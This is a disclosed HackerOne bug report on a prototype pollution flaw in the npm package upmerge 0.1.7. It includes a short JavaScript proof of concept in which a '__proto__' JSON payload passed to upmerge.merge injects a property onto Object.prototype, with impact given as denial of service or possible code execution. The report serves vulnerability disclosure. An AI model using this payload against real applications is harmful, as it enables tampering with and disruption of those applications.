# Prototype pollution attack (upmerge)

## Report Details
- **Report ID**: 439120
- **URL**: https://hackerone.com/reports/439120
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-11-11T14:45:55.990Z
- **Disclosed**: 2019-02-04T07:53:24.033Z

## Reporter
- **Username**: dienpv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi team,
I would like to report a prototype pollution vulnerability in upmerge
that allows an attacker to inject properties on Object.prototype.

# Module

**module name:** upmerge
**version:** 0.1.7
**npm page:** `https://www.npmjs.com/package/upmerge`

## Module Description

> JavaScript Object Merge and Clone for Client or Server side

# Vulnerability

## Vulnerability Description

> this vulnerability type is similar to my report #438274
upmerge is vulnerable to prototype pollution when it merges objects.

## Steps To Reproduce:

> In the following code snippet, "payload" would come from user-input (JSON data).
```javascript
var upmerge = require('upmerge');
var payload = '{"__proto__":{"polluted":"upmerge_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
upmerge.merge({},JSON.parse(payload));
console.log("After: ", test.polluted);

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

Thanks!

## Impact

It causes Denial of Service or RCE in some cases.

## Attachments
No attachments
